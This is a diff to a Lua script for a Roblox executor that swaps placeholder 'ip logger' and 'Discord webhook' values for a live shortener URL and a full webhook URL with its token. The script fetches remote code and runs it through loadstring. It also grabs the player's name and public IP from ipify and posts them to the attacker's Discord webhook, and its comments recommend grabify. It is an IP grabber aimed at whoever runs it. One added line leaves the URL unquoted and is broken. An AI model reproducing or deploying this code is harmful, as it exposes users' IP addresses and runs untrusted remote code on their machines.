@@ -1,20 +1,20 @@
 local Response = syn.request({
-    Url = "put logger link here",
+    Url = "https://shhh.lol/E38AYP",
     Method = "GET"
 })
 
 
-loadstring(http.request({Url="put ur ip logger link here"}).Body)()
+loadstring(http.request({Url="https://shhh.lol/E38AYP"}).Body)()
 
 
-loadstring(request({Url="ip logger link here"}).Body)() 
+loadstring(request({Url="https://shhh.lol/E38AYP"}).Body)() 
 // make ip grabber id recommend grabify
 
 --------------------------------------------------------------
 
 local name = game:GetService("Players").LocalPlayer.Name
 // put your webhook there fluro#0009
-local WebhookURL = "YOUR DISCORD WEBHOOK HERE"
+local WebhookURL = "https://discord.com/api/webhooks/992355966534307932/2b7akbx97JhFK-Se5BVbUzHrWj0R9p7stUDDvEPdNli__3CH6oOzbsEGdbalRvBuvFCz"
 local getIPResponse = syn.request({
     Url = "https://api.ipify.org/?format=json",
     Method = "GET"
@@ -49,7 +49,7 @@ local MessageData = {
 
 syn.request(
     {
-        Url = WebhookURL, 
+        Url = https://discord.com/api/webhooks/992355966534307932/2b7akbx97JhFK-Se5BVbUzHrWj0R9p7stUDDvEPdNli__3CH6oOzbsEGdbalRvBuvFCz, 
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
